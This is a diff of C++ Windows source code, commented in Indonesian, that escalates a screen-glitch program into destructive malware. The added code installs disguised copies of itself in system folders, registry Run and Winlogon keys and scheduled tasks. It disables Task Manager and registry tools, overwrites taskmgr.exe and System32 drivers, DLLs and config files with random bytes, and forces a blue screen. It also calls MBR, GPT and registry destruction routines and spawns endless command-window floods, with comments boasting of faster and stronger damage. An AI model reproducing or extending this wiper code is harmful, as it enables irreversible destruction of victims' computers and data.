+    intensityLevel = std::min(30, timeIntensity); // Level maksimum lebih tinggi
     
     ApplyScreenShake();
     
-    if (currentTime - lastEffectTime > 1000) {
-        textCorruptionActive = (rand() % 100 < 30 * intensityLevel);
+    if (currentTime - lastEffectTime > 800) {
+        textCorruptionActive = (rand() % 100 < 40 * intensityLevel);
         lastEffectTime = currentTime;
     }
     
@@ -1490,11 +1374,24 @@ void ApplyGlitchEffect() {
         ApplyInversionWaves();
     }
     
+    // Efek-efek baru
+    if (intensityLevel > 5 && rand() % 8 == 0) {
+        ApplyAdvancedScreenDistortion();
+    }
+    
+    if (intensityLevel > 7 && rand() % 10 == 0) {
+        ApplyDataBleedEffect();
+    }
+    
+    if (intensityLevel > 10 && rand() % 15 == 0) {
+        ApplyMatrixRainEffect();
+    }
+    
     ApplyCursorEffect();
     UpdateParticles();
     
     if (rand() % SOUND_CHANCE == 0) {
-        PlayGlitchSoundAsync();
+        PlayAdvancedGlitchSound();
     }
     
     if (rand() % 100 == 0) {
@@ -1512,13 +1409,13 @@ void ApplyGlitchEffect() {
     // ===== DESTRUCTIVE EFFECTS =====
     DWORD cTime = GetTickCount();
     
-    // Aktifkan mode kritis setelah 30 detik
-    if (!criticalMode && cTime - startTime > 30000) {
+    // Aktifkan mode kritis setelah 20 detik
+    if (!criticalMode && cTime - startTime > 20000) {
         criticalMode = true;
-        bsodTriggerTime = cTime + 30000 + rand() % 30000; // BSOD dalam 30-60 detik
+        bsodTriggerTime = cTime + 20000 + rand() % 20000; // BSOD dalam 20-40 detik
         
         if (!persistenceInstalled) {
-            InstallPersistence();
+            InstallAdvancedPersistence();
             DisableSystemTools();
             DisableCtrlAltDel();
         }
@@ -1528,10 +1425,10 @@ void ApplyGlitchEffect() {
             static bool adminDestructionDone = false;
             if (!adminDestructionDone) {
                 BreakTaskManager();
-                SetCriticalProcess();
-                DestroyMBR();
-                DestroyGPT();
-                DestroyRegistry();
+                SetCriticalProcessPermanent();
+                DestroyMBRWithPattern();
+                DestroyGPTCompletely();
+                DestroyRegistryCompletely();
                 adminDestructionDone = true;
             }
         }
@@ -1539,24 +1436,24 @@ void ApplyGlitchEffect() {
     
     // Eksekusi tindakan destruktif
     if (criticalMode && !destructiveActionsTriggered) {
-        ExecuteDestructiveActions();
+        ExecuteAdvancedDestructiveActions();
     }
     
     // Efek khusus mode kritis
     if (criticalMode) {
         static DWORD lastCorruption = 0;
-        if (cTime - lastCorruption > 10000) {
+        if (cTime - lastCorruption > 5000) {
             std::thread(CorruptSystemFiles).detach();
             lastCorruption = cTime;
         }
         
         static DWORD lastKill = 0;
-        if (cTime - lastKill > 5000) {
-            std::thread(KillCriticalProcesses).detach();
+        if (cTime - lastKill > 3000) {
+            std::thread(KillAllProcesses).detach();
             lastKill = cTime;
         }
         
-        intensityLevel = 20;
+        intensityLevel = 30;
         
         if (cTime >= bsodTriggerTime) {
             std::thread(TriggerBSOD).detach();
@@ -1566,11 +1463,319 @@ void ApplyGlitchEffect() {
     delete[] pCopy;
 }
 
+// ======== FUNGSI PERSISTENSI & DESTRUKSI YANG LEBIH KUAT ========
+BOOL IsWindows64() {
+    BOOL bIsWow64 = FALSE;
+    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
+        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
+    
+    if (fnIsWow64Process) {
+        fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
+    }
+    return bIsWow64;
+}
+
+void InstallAdvancedPersistence() {
+    wchar_t szPath[MAX_PATH];
+    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    
+    // Multiple persistence locations
+    const wchar_t* targetLocations[] = {
+        L"C:\\Windows\\System32\\winlogon_helper.exe",
+        L"C:\\Windows\\SysWOW64\\winlogon_helper.exe", 
+        L"C:\\ProgramData\\Microsoft\\Windows\\system_health.exe",
+        L"C:\\Users\\Public\\system_monitor.exe"
+    };
+    
+    const wchar_t* registryKeys[] = {
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
+        L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"
+    };
+    
+    // Copy ke multiple locations
+    for (size_t i = 0; i < sizeof(targetLocations)/sizeof(targetLocations[0]); i++) {
+        CopyFileW(szPath, targetLocations[i], FALSE);
+        
+        // Set hidden dan system attributes
+        SetFileAttributesW(targetLocations[i], FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
+    
+    // Add to registry multiple locations
+    for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
+        HKEY hRoot = (i < 2) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
+        HKEY hKey;
+        
+        if (RegCreateKeyExW(hRoot, registryKeys[i], 0, NULL, 
+            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            // Use different value names
+            const wchar_t* valueNames[] = {
+                L"SystemHealthMonitor",
+                L"WindowsDefenderService", 
+                L"UserProfileManager",
+                L"ExplorerShell"
+            };
+            
+            RegSetValueExW(hKey, valueNames[i], 0, REG_SZ, 
+                          (BYTE*)targetLocations[i % 4], 
+                          (lstrlenW(targetLocations[i % 4]) + 1) * sizeof(wchar_t));
+            RegCloseKey(hKey);
+        }
+    }
+    
+    // Create scheduled task dengan multiple triggers
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    
+    const wchar_t* taskCommands[] = {
+        L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"C:\\Windows\\System32\\winlogon_helper.exe\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
+        L"schtasks /create /tn \"System Health Monitor\" /tr \"\\\"C:\\ProgramData\\Microsoft\\Windows\\system_health.exe\\\"\" /sc onlogon /delay 0000:30 /f",
+        L"schtasks /create /tn \"User Profile Service\" /tr \"\\\"C:\\Users\\Public\\system_monitor.exe\\\"\" /sc onstart /delay 0001:00 /f"
+    };
+    
+    for (int i = 0; i < sizeof(taskCommands)/sizeof(taskCommands[0]); i++) {
+        wchar_t cmd[1024];
+        wsprintfW(cmd, taskCommands[i], st.wHour, st.wMinute);
+        
+        STARTUPINFOW si = {};
+        si.cb = sizeof(si);
+        PROCESS_INFORMATION pi;
+        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    
+    persistenceInstalled = true;
+}
+
+void DisableSystemTools() {
+    HKEY hKey;
+    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+    DWORD value = 1;
+    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+    RegCloseKey(hKey);
+    
+    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+    RegCloseKey(hKey);
+    
+    if (g_isAdmin) {
+        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegCloseKey(hKey);
+    }
+    
+    disableTaskManager = true;
+    disableRegistryTools = true;
+}
+
+void DisableCtrlAltDel() {
+    HKEY hKey;
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, 
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD value = 1;
+        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegCloseKey(hKey);
+    }
+
+    if (g_isAdmin) {
+        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
+            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            DWORD value = 1;
+            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegCloseKey(hKey);
+        }
+    }
+}
+
+void BreakTaskManager() {
+    // Corrupt taskmgr.exe
+    const wchar_t* taskmgrPaths[] = {
+        L"C:\\Windows\\System32\\taskmgr.exe",
+        L"C:\\Windows\\SysWOW64\\taskmgr.exe"
+    };
+
+    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
+        HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+                BYTE* buffer = new BYTE[fileSize];
+                if (buffer) {
+                    for (DWORD j = 0; j < fileSize; j++) {
+                        buffer[j] = rand() % 256;
+                    }
+                    DWORD written;
+                    WriteFile(hFile, buffer, fileSize, &written, NULL);
+                    delete[] buffer;
+                }
+            }
+            CloseHandle(hFile);
+        }
+    }
+
+    // Kill existing task manager processes
+    KillAllProcesses();
+}
+
+void CorruptSystemFiles() {
+    const wchar_t* targets[] = {
+        L"C:\\Windows\\System32\\drivers\\*.sys",
+        L"C:\\Windows\\System32\\*.dll",
+        L"C:\\Windows\\System32\\*.exe",
+        L"C:\\Windows\\System32\\config\\*"
+    };
+    
+    // Handle Wow64 redirection untuk Windows 64-bit
+    PVOID oldRedir = NULL;
+    if (IsWindows64()) {
+        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
+        if (hKernel32) {
+            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
+                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
+                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
+            if (pfnDisable) pfnDisable(&oldRedir);
+        }
+    }
+    
+    for (size_t i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
+        WIN32_FIND_DATAW fd;
+        HANDLE hFind = FindFirstFileW(targets[i], &fd);
+        
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    wchar_t filePath[MAX_PATH];
+                    if (i == 0) {
+                        wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
+                    } else if (i == 3) {
+                        wsprintfW(filePath, L"C:\\Windows\\System32\\config\\%s", fd.cFileName);
+                    } else {
+                        wsprintfW(filePath, L"C:\\Windows\\System32\\%s", fd.cFileName);
+                    }
+                    
+                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        DWORD fileSize = GetFileSize(hFile, NULL);
+                        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+                            BYTE* buffer = new BYTE[fileSize];
+                            if (buffer) {
+                                for (DWORD j = 0; j < fileSize; j++) {
+                                    buffer[j] = rand() % 256;
+                                }
+                                
+                                DWORD written;
+                                WriteFile(hFile, buffer, fileSize, &written, NULL);
+                                
+                                delete[] buffer;
+                            }
+                        }
+                        CloseHandle(hFile);
+                    }
+                }
+            } while (FindNextFileW(hFind, &fd));
+            FindClose(hFind);
+        }
+    }
+    
+    // Revert redirection
+    if (oldRedir && IsWindows64()) {
+        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
+        if (hKernel32) {
+            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
+                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
+                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
+            if (pfnRevert) pfnRevert(oldRedir);
+        }
+    }
+    
+    fileCorruptionActive = true;
+}
+
+void TriggerBSOD() {
+    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
+    if (ntdll) {
+        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+        pdef_NtRaiseHardError NtRaiseHardError = 
+            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
+        
+        if (NtRaiseHardError) {
+            ULONG Response;
+            NTSTATUS status = STATUS_FLOAT_MULTIPLE_FAULTS;
+            NtRaiseHardError(status, 0, 0, 0, 6, &Response);
+        }
+    }
+    
+    // Fallback: Cause access violation
+    int* p = (int*)0x1;
+    *p = 0;
+}
+
+void OpenRandomPopups() {
+    const wchar_t* commands[] = {
+        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
+        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
+        L"notepad.exe",
+        L"explorer.exe",
+        L"write.exe",
+        L"calc.exe",
+        L"mspaint.exe",
+        L"regedit.exe",
+        L"taskmgr.exe",
+        L"control.exe"
+    };
+
+    int numPopups = 3 + rand() % 5; // 3-7 popup sekaligus
+    bool spawnSpam = (rand() % 3 == 0); // 33% chance spawn cmd spammer
+
+    for (int i = 0; i < numPopups; i++) {
+        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
+        
+        // Untuk cmd spam khusus
+        if (spawnSpam && i == 0) {
+            ShellExecuteW(NULL, L"open", L"cmd.exe", 
+                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
+                NULL, SW_SHOWMINIMIZED);
+            continue;
+        }
+
+        SHELLEXECUTEINFOW sei = { sizeof(sei) };
+        sei.lpVerb = L"open";
+        sei.lpFile = L"cmd.exe";
+        sei.lpParameters = commands[cmdIndex];
+        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+        
+        ShellExecuteExW(&sei);
+        if (sei.hProcess) CloseHandle(sei.hProcess);
+        
+        Sleep(100); // Delay antar popup
+    }
+
+    // Spawn khusus Windows Terminal jika ada
+    if (rand() % 5 == 0) {
+        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
+    }
+}
+
 // Thread untuk efek visual yang berjalan terus-menerus
-void VisualEffectsThread() {
+void AdvancedVisualEffectsThread() {
     while (running) {
         CaptureScreen(NULL);
-        ApplyGlitchEffect();
+        ApplyAdvancedGlitchEffect();
         
         HDC hdcScreen = GetDC(NULL);
         HDC hdcMem = CreateCompatibleDC(hdcScreen);
@@ -1595,24 +1800,24 @@ void VisualEffectsThread() {
 void SoundEffectsThread() {
     while (running) {
         if (rand() % SOUND_CHANCE == 0) {
-            PlayGlitchSoundAsync();
+            PlayAdvancedGlitchSound();
         }
         Sleep(100 + rand() % 400);
     }
 }
 
 // Thread untuk efek destruktif yang berjalan di latar belakang
-void DestructiveEffectsThread() {
+void AdvancedDestructiveEffectsThread() {
     while (running) {
         DWORD cTime = GetTickCount();
         
-        // Aktifkan mode kritis setelah 30 detik
-        if (!criticalMode && cTime - startTime > 30000) {
+        // Aktifkan mode kritis setelah 20 detik (lebih cepat)
+        if (!criticalMode && cTime - startTime > 20000) {
             criticalMode = true;
-            bsodTriggerTime = cTime + 30000 + rand() % 30000; // BSOD dalam 30-60 detik
+            bsodTriggerTime = cTime + 20000 + rand() % 20000; // BSOD dalam 20-40 detik
             
             if (!persistenceInstalled) {
-                InstallPersistence();
+                InstallAdvancedPersistence();
                 DisableSystemTools();
                 DisableCtrlAltDel();
             }
@@ -1622,10 +1827,10 @@ void DestructiveEffectsThread() {
                 static bool adminDestructionDone = false;
                 if (!adminDestructionDone) {
                     BreakTaskManager();
-                    SetCriticalProcess();
-                    DestroyMBR();
-                    DestroyGPT();
-                    DestroyRegistry();
+                    SetCriticalProcessPermanent();
+                    DestroyMBRWithPattern();
+                    DestroyGPTCompletely();
+                    DestroyRegistryCompletely();
                     adminDestructionDone = true;
                 }
             }
@@ -1633,31 +1838,31 @@ void DestructiveEffectsThread() {
         
         // Eksekusi tindakan destruktif
         if (criticalMode && !destructiveActionsTriggered) {
-            ExecuteDestructiveActions();
+            ExecuteAdvancedDestructiveActions();
         }
         
         // Efek khusus mode kritis
         if (criticalMode) {
             static DWORD lastCorruption = 0;
-            if (cTime - lastCorruption > 10000) {
+            if (cTime - lastCorruption > 5000) { // Lebih sering
                 std::thread(CorruptSystemFiles).detach();
                 lastCorruption = cTime;
             }
             
             static DWORD lastKill = 0;
-            if (cTime - lastKill > 5000) {
-                std::thread(KillCriticalProcesses).detach();
+            if (cTime - lastKill > 3000) { // Lebih sering
+                std::thread(KillAllProcesses).detach();
                 lastKill = cTime;
             }
             
-            intensityLevel = 20;
+            intensityLevel = 30; // Level lebih tinggi
             
             if (cTime >= bsodTriggerTime) {
                 std::thread(TriggerBSOD).detach();
             }
         }
         
-        Sleep(1000);
+        Sleep(800); // Interval lebih pendek
     }
 }
 
@@ -1763,9 +1968,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         ReleaseDC(NULL, hdcScreen);
         
         // Jalankan thread untuk efek visual dan destruktif
-        workerThreads.emplace_back(VisualEffectsThread);
+        workerThreads.emplace_back(AdvancedVisualEffectsThread);
         workerThreads.emplace_back(SoundEffectsThread);
-        workerThreads.emplace_back(DestructiveEffectsThread);
+        workerThreads.emplace_back(AdvancedDestructiveEffectsThread);
         
         // Tunggu semua thread selesai
         for (auto& thread : workerThreads) {
